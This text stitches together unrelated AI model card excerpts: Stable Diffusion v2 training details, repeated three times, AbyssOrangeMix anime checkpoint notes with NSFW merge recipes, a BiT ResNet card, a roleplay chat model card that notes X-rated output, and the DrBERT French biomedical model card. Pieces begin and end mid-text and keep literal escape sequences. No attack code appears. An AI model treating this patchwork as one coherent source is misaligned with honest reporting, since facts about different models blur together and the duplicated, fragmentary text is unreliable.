For more details, please refer to LAION-5B's NeurIPS 2022 paper and reviewer discussions on the topic.\nTraining Procedure\nStable Diffusion v2 is a latent diffusion model which combines an autoencoder with a diffusion model that is trained in the latent space of the autoencoder. During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.

During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.

With rich, bold colors and flat shading, it embodies the style seen in anime and manga.”\nOne of the versions of OrangeMixs, AbyssOrangeMix1~3 (AOM), has improved the anatomical accuracy of the human body by merging photorealistic models, but I was dissatisfied with the too-realistic shapes and shadows.VividOrangeMix is a model that has been adjusted to solve this problem.\n▼Sample Gallery\nDefault\nLoRA\nVividOrangeMix_NSFW / Hard\n▼About\nVividOrangeMix NSFW/Hard is, as before, a model that Merges elements of NAI and Gape by U-Net Blocks Weight method.\nAs of AOM3, elements of these models should be included, but when I simply merged other models, the elements of the old merge seem to gradually fade away. Also, by merging U-Net Blocks Weight, it is now possible to merge without affecting the design to some extent, but some changes are unavoidable, so I decided to upload it separately as before. .\n▼Sample Gallery\n←NSFW | Hard→\nInstructions\n▼Tool\nhttps://github.com/hako-mikan/sd-webui-supermerger/\n▼VividOrangeMix\nSTEP: 1 | Base model create\nGO TO AOM3B4 Instructions↓\nSTEP: 2 | Model merge\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nAOM3B4\nAnimelike_2D_Pruend_fp16\nsum @ 0.3\nVividOrangeMix\n▼VividOrangeMix_NSFW\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nVividOrangeMix\nNAI full\nNAI sfw\nAdd Difference @ 1.0\n0,0.25,0.25,0.25,0.25,0.25,0,0,0,0,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.2,0.25,0.25,0.25,0.25,0,0\nVividOrangeMix_NSFW\n▼VividOrangeMix_Hard\nModel: A\nModel: B\nModel: C\nInterpolation Method\nWeight\nMerge Name\nVividOrangeMix_NSFW\ngape60\nNAI full\nAdd Difference @ 1.0\n0.0,0.25,0.25,0.25,0.25,0.25,0.0,0.0,0.0,0.0,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.25,0.0,0.0\nVividOrangeMix_Hard\nAbyssOrangeMix3 (AOM3)\n――Everyone has different “ABYSS”!\n▼About\nThe main model, \"AOM3 (AbyssOrangeMix3)\", is a purely upgraded model that improves on the problems of the previous version, \"AOM2\". \"AOM3\" can generate illustrations with very realistic textures and can generate a wide variety of content. There are also three variant models based on the AOM3 that have been adjusted to a unique illustration style. These models will help you to express your ideas more clearly.\n▼Links\n[⚠NSFW] Civitai: AbyssOrangeMix3 (AOM3) | Stable Diffusion Checkpoint | https://civitai.com/models/9942/abyssorangemix3-aom3\nAbout\nFeatures: high-quality, realistic textured illustrations can be generated.There are two major changes from AOM2.\n1: Models for NSFW such as _nsfw and _hard have been improved: the models after nsfw in AOM2 generated creepy realistic faces, muscles and ribs when using Hires.fix, even though they were animated characters. These have all been improved in AOM3.\ne.g.: explanatory diagram by MEME : GO TO MEME ZONE↓\n2: sfw/nsfw merged into one model. Originally, nsfw models were separated because adding NSFW content (models like NAI and gape) would change the face and cause the aforementioned problems. Now that those have been improved, the models can be packed into one.In addition, thanks to excellent extensions such as ModelToolkit, the model file size could be reduced (1.98 GB per model).\nMore feature\nIn addition, these U-Net Blocks Weight Merge models take numerous steps but are carefully merged to ensure that mutual content is not overwritten.\n(Of course, all models allow full control over adult content.)\n🔐 When generating illustrations for the general public: write \"nsfw\" in the negative prompt field\n🔞 When generating adult illustrations: \"nsfw\" in the positive prompt field -> It can be generated without putting it in. If you include it, the atmosphere will be more NSFW.\nVariations / Sample Gallery\n🚧Editing🚧\nAOM3\n▼AOM3\n(Actually, this gallery doesn't make much sense since AOM3 is mainly an improvement of the NSFW part 😂  ...But we can confirm that the picture is not much different from AOM2sfw.)\nAOM3A1\n⛔Only this model (AOM3A1) includes ChilloutMix. The curse of the DreamLike license. In other words, only AOM3A1 is not available for commercial use. I recommend AOM3A1B instead.⛔\nGO TO MEME ZONE↓\nFeatures: Anime like illustrations with flat paint. Cute enough as it is, but I really like to apply LoRA of anime characters to this model to generate high quality anime illustrations like a frame from a theatre version.\n▼A1\n©\n(1)©Yurucamp: Inuyama Aoi, (2)©The Quintessential Quintuplets: Nakano Yotsuba, (3)©Sailor Moon: Mizuno Ami/SailorMercury\nAOM3A2\n🚧Editing🚧\nFeatures: Oil paintings like style artistic illustrations and stylish background depictions. In fact, this is mostly due to the work of Counterfeit 2.5, but the textures are more realistic thanks to the U-Net Blocks Weight Merge.\nAOM3A3\n🚧Editing🚧\nFeatures: Midpoint of artistic and kawaii. the model has been tuned to combine realistic textures, a artistic style that also feels like an oil colour style, and a cute anime-style face. Can be used to create a wide range of illustrations.\nAOM3A1B\nAOM3A1B added. This model is my latest favorite. I recommend it for its moderate realism, moderate brush touch, and moderate LoRA conformity.The model was merged by mistakenly selecting 'Add sum' when 'Add differences' should have been selected in the AOM3A3AOM3A2 recipe. It was an unintended merge, but we share it because the illustrations produced are consistently good results.The model was merged by mistakenly selecting 'Add sum' when 'Add differences' should have been selected in the AOM3A3AOM3A2 recipe.

However, the faces and compositions are not an exact match to AOM2sfw.AOM2sfw is sometimes superior when generating SFW content. I recommend choosing according to the intended use of the illustration.See below for a comparison between AOM2sfw and AOM3.\n▼A summary of the AOM3 work is as follows\ninvestigated the impact of the NAI and gape layers as AOM2 _nsfw onwards is crap.\ncut face layer: OUT04 because I want realistic faces to stop → Failed. No change.\ngapeNAI layer investigation｜  a. (IN05-08 (especially IN07) | Change the illustration   significantly. Noise is applied, natural colours are lost, shadows die, and we can see that the IN deep layer is a layer of light and shade.  b. OUT03-05(?) | likely to be sexual section/NSFW layer.Cutting here will kill the NSFW.  c. OUT03,OUT04｜NSFW effects are in(?). e.g.: spoken hearts, trembling, motion lines, etc...  d. OUT05｜This is really an NSFW switch. All the \"NSFW atmosphere\" is in here. Facial expressions, Heavy breaths, etc...  e. OUT10-11｜Paint layer. Does not affect detail, but does have an extensive impact.\n(mass production of rubbish from here...)\ncut IN05-08 and merge NAIgape with flat parameters → avoided creepy muscles and real faces. Also, merging NSFW models stronger has less impact.\nso, cut IN05-08, OUT10-11 and merge NAI+gape with all others 0.5.\n→ AOM3AOM3 roughly looks like this\n▼How to use\nPrompts\nNegative prompts is As simple as possible is good.

It can also be used for a variety of purposes, making it extremely useful for design and artwork.\nFurthermore, it provides an unparalleled new means of expression.\nIt can generate illustrations in a variety of genres to meet a wide range of needs. I encourage you to use \"Abyss\" to make your designs and artwork richer and of higher quality.\n※nvidia joke.\n▼Description for engineers/enthusiasts\nThe merged model was formulated using an extension such as sdweb-merge-block-weighted-gui, which merges models at separate rates for each of the 25 U-Net blocks (input, intermediate, and output).\nThe validation of many Anons has shown that such a recipe can generate a painting style that is anatomically realistic enough to feel the finger skeleton, but still maintains an anime-style face.\nThe changes from AbyssOrangeMix are as follows.\nthe model used for U-Net Blocks Weight Merge was changed from Instagram+F222 to BasilMix. (https://huggingface.co/nuigurumi)\nThis is an excellent merge model that can generate decent human bodies while maintaining the facial layers of the Instagram model. Thanks!!!\nThis has improved the dullness of the color and given a more Japanese skin tone (or more precisely, the moisturized white skin that the Japanese would ideally like).\nAlso, the unnatural bokeh that sometimes occurred in the previous version may have been eliminated (needs to be verified).\n2.Added IN deep layers (IN06-11) to the layer merging from the realistic model (BasilMix).\nIt is said that the IN deep layer (IN06-11) is the layer that determines composition, etc., but perhaps light, reflections, skin texture, etc., may also be involved.\nIt is like \"Global Illumination\", \"Ray tracing\" and \"Ambient Occlusion\" in 3DCG.\n※This does not fundamentally improve the fingers. Therefore, More research needs to be done to improve the fingers (e.g. 'bad_prompt').\nAbout 30-50% chance of generating correct fingers(?). Abyss is deep.\n▼Sample Gallery\nThe prompts for generating these images were all generated using ChatGPT. I simply asked \"Pirates sailing the oceans\" to tell me what the prompts were.However, to make sure the AI understood the specifications, I used the template for AI questions (Question template for AI prompt generation(v1.2) ).\nPlease review the following.\nhttps://seesaawiki.jp/nai_ch/d/AI%a4%f2%b3%e8%cd%d1%a4%b7%a4%bf%a5%d7%a5%ed%a5%f3%a5%d7%a5%c8%c0%b8%c0%ae\nThe images thus generated, strangely enough, look like MidJourney or Nijijourney illustrations. Perhaps they are passing user prompts through GPT or something else before passing them on to the image AI🤔\n▼READ MORE🖼\n▼All prompts to generate sample images\nGaming Girl\nFantasy\nRainy Day\nKemomimi Girl\nSupermarket\nLunch Time\nWomens in the Garden\nPirate\nJapanese Girl\nSweets Time\nGlasses Girl\n▼How to use\nVAE: orangemix.vae.pt\nPrompts can be long or shortAs simple as possible is good.

To partially mitigate this, we have filtered the dataset using LAION's NFSW detector (see Training section).\nBias\nWhile the capabilities of image generation models are impressive, they can also reinforce or exacerbate social biases.\nStable Diffusion was primarily trained on subsets of LAION-2B(en),\nwhich consists of images that are limited to English descriptions.\nTexts and images from communities and cultures that use other languages are likely to be insufficiently accounted for.\nThis affects the overall output of the model, as white and western cultures are often set as the default. Further, the\nability of the model to generate content with non-English prompts is significantly worse than with English-language prompts.\nStable Diffusion v2 mirrors and exacerbates biases to such a degree that viewer discretion must be advised irrespective of the input or its intent.\nTraining\nTraining Data\nThe model developers used the following dataset for training the model:\nLAION-5B and subsets (details below). The training data is further filtered using LAION's NSFW detector, with a \"p_unsafe\" score of 0.1 (conservative). For more details, please refer to LAION-5B's NeurIPS 2022 paper and reviewer discussions on the topic.\nTraining Procedure\nStable Diffusion v2 is a latent diffusion model which combines an autoencoder with a diffusion model that is trained in the latent space of the autoencoder. During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.

The method results in significant improvements for transfer learning.\nDisclaimer: The team releasing ResNet did not write a model card for this model so this model card has been written by the Hugging Face team.\nModel description\nThe abstract from the paper is the following:\nTransfer of pre-trained representations improves sample efficiency and simplifies hyperparameter tuning when training deep neural networks for vision. We revisit the paradigm of pre-training on large supervised datasets and fine-tuning the model on a target task. We scale up pre-training, and propose a simple recipe that we call Big Transfer (BiT). By combining a few carefully selected components, and transferring using a simple heuristic, we achieve strong performance on over 20 datasets. BiT performs well across a surprisingly wide range of data regimes -- from 1 example per class to 1M total examples. BiT achieves 87.5% top-1 accuracy on ILSVRC-2012, 99.4% on CIFAR-10, and 76.3% on the 19 task Visual Task Adaptation Benchmark (VTAB). On small datasets, BiT attains 76.8% on ILSVRC-2012 with 10 examples per class, and 97.0% on CIFAR-10 with 10 examples per class. We conduct detailed analysis of the main components that lead to high transfer performance.\nIntended uses & limitations\nYou can use the raw model for image classification.

It will output X-rated content under certain circumstances.\nTraining data\nThe fine-tuning dataset consisted of 56MB of dialogue data gathered from multiple sources, which includes both real and partially machine-generated conversations.\nTraining procedure\nFine-tuning was done using ColossalAI (specifically, with a slightly modified version of their OPT fine-tune example) for around 11.4 million tokens over 5440 steps on a single 24GB GPU. The run took just under 21 hours.\nIntended use\nThe easy way\nWe provide a notebook with a Gradio UI for playing around with the model without having to manually format inputs. This notebook can be found here.\nThe manual way\nThe model can be used as a regular text generation model, but it'll perform best if the input prompt adheres to the following format:\n[CHARACTER]'s Persona: [A few sentences about the character you want the model to play]\n[DIALOGUE HISTORY]\nYou: [Your input message here]\n[CHARACTER]:\nWhere [CHARACTER] is, as you can probably guess, the name of the character you want the model to portray, and [DIALOGUE HISTORY] is chat history so the model can have some conversational context to draw from. Ideally it'll be pairs of messages like:\n[CHARACTER]: [some dialogue here]\nYou: [your response to the dialogue above]\nApart from chat history, you can also just add example conversations in [DIALOGUE HISTORY] to show how the character should speak - ideally at the beginning, so it doesn't get confused as to what's conversation history vs. character definition.\nKnown issues\nThe model can get stuck repeating certain phrases, or sometimes even entire sentences.\nWe believe this is due to that behavior being present in the training data itself, and plan to investigate and adjust accordingly for future versions.",

Fine-tuning on a downstream task\nCitation BibTeX\nDrBERT: A Robust Pre-trained Model in French for Biomedical and Clinical domains\nIn recent years, pre-trained language models (PLMs) achieve the best performance on a wide range of natural language processing (NLP) tasks. While the first models were trained on general domain data, specialized ones have emerged to more effectively treat specific domains.\nIn this paper, we propose an original study of PLMs in the medical domain on French language. We compare, for the first time, the performance of PLMs trained on both public data from the web and private data from healthcare establishments. We also evaluate different learning strategies on a set of biomedical tasks.\nFinally, we release the first specialized PLMs for the biomedical field in French, called DrBERT, as well as the largest corpus of medical data under free license on which these models are trained.\n1. DrBERT models\nDrBERT is a French RoBERTa trained on a open source corpus of French medical crawled textual data called NACHOS. Models with different amount of data from differents public and private sources are trained using the CNRS (French National Centre for Scientific Research) Jean Zay French supercomputer. Only the weights of the models trained using exclusively open-sources data are publicly released to prevent any personnal information leak and to follow the european GDPR laws :\nModel name\nCorpus\nNumber of layers\nAttention Heads\nEmbedding Dimension\nSequence Length\nModel URL\nDrBERT-7-GB-cased-Large\nNACHOS 7 GB\n24\n16\n1024\n512\nHuggingFace\nDrBERT-7-GB-cased\nNACHOS 7 GB\n12\n12\n768\n512\nHuggingFace\nDrBERT-4-GB-cased\nNACHOS 4 GB\n12\n12\n768\n512\nHuggingFace\nDrBERT-4-GB-cased-CP-CamemBERT\nNACHOS 4 GB\n12\n12\n768\n512\nHuggingFace\nDrBERT-4-GB-cased-CP-PubMedBERT\nNACHOS 4 GB\n12\n12\n768\n512\nHuggingFace\n2. Using DrBERT\nYou can use DrBERT with Hugging Face's Transformers library as follow.\nLoading the model and tokenizer :\nfrom transformers import AutoModel, AutoTokenizer\ntokenizer = AutoTokenizer.from_pretrained(\"Dr-BERT/DrBERT-7GB\")\nmodel = AutoModel.from_pretrained(\"Dr-BERT/DrBERT-7GB\")\nPerform the mask filling task :\nfrom transformers import pipeline\nfill_mask  = pipeline(\"fill-mask\", model=\"Dr-BERT/DrBERT-7GB\", tokenizer=\"Dr-BERT/DrBERT-7GB\")\nresults = fill_mask(\"La patiente est atteinte d'une <mask>\")\n3. Pre-training DrBERT tokenizer and model from scratch by using HuggingFace Transformers Library\n3.1 Install dependencies\naccelerate @ git+https://github.com/huggingface/accelerate@66edfe103a0de9607f9b9fdcf6a8e2132486d99b\ndatasets==2.6.1\nsentencepiece==0.1.97\nprotobuf==3.20.1\nevaluate==0.2.2\ntensorboard==2.11.0\ntorch >= 1.3\n3.2 Download NACHOS Dataset text file\nDownload the full NACHOS dataset from Zenodo and place it the the from_scratch or continued_pretraining directory.\n3.3 Build your own tokenizer from scratch based on NACHOS\nNote : This step is required only in the case of an from scratch pre-training, if you want to do a continued pre-training you just have to download the model and the tokenizer that correspond to the model you want to continue the training from. In this case, you simply have to go to the HuggingFace Hub, select a model (for example RoBERTa-base). Finally, you have to download the entire model / tokenizer repository by clicking on the Use In Transformers button and get the Git link git clone https://huggingface.co/roberta-base.\nBuild the tokenizer from scratch on your data of the file ./corpus.txt by using ./build_tokenizer.sh.\n3.4 Preprocessing and tokenization of the dataset\nFirst, replace the field tokenizer_path of the shell script to match the path of your tokenizer directory downloaded before using HuggingFace Git or the one you have build.\nRun ./preprocessing_dataset.sh to generate the tokenized dataset by using the givent tokenizer.\n3.5 Model training\nFirst, change the number of GPUs --ntasks=128 you are needing to match your computational capabilities in the shell script called run_training.sh. In our case, we used 128 V100 32 GB GPUs from 32 nodes of 4 GPUs (--ntasks-per-node=4 and --gres=gpu:4) during 20 hours (--time=20:00:00).\nIf you are using Jean Zay, you also need to change the -A flag to match one of your @gpu profile capable of running the job. You also need to move ALL of your datasets, tokenizer, script and outputs on the $SCRATCH disk space to preserve others users of suffuring of IO issues.\n3.5.1 Pre-training from scratch\nOnce the SLURM parameters updated, you have to change name of the model architecture in the flag --model_type=\"camembert\" and to update the --config_overrides= according to the specifications of the architecture you are trying to train. In our case, RoBERTa had a 514 sequence length, a vocabulary of 32005 (32K tokens of the tokenizer and 5 of the model architecture) tokens, the identifier of the beginning-of-sentence token (BOS) and end-of-sentence token (EOS) are respectivly 5 and 6. Change the\nThen, go to ./from_scratch/ directory.\nRun sbatch ./run_training.sh to send the training job in the SLURM queue.\n3.5.2 continue pre-training\nOnce the SLURM parameters updated, you have to change path of the model / tokenizer you want to start from --model_name_or_path= / --tokenizer_name= to the path of the model downloaded from HuggingFace's Git in the section 3.3.\nThen, go to ./continued_pretraining/ directory.\nRun sbatch ./run_training.sh to send the training job in the SLURM queue.\n4. Fine-tuning on a downstream task\nYou just need to change the name of the model to Dr-BERT/DrBERT-7GB in any of the examples given by HuggingFace's team here.\nCitation BibTeX\n@inproceedings{labrak2023drbert,\ntitle = {{DrBERT: A Robust Pre-trained Model in French for Biomedical and Clinical domains}},\nauthor = {Labrak, Yanis and Bazoge, Adrien and Dufour, Richard and Rouvier, Mickael and Morin, Emmanuel and Daille, Béatrice and Gourraud, Pierre-Antoine},\nbooktitle = {Proceedings of the 61th Annual Meeting of the Association for Computational Linguistics (ACL'23), Long Paper},\nmonth = july,\nyear = 2023,\naddress = {Toronto, Canada},\npublisher = {Association for Computational Linguistics}\n}",
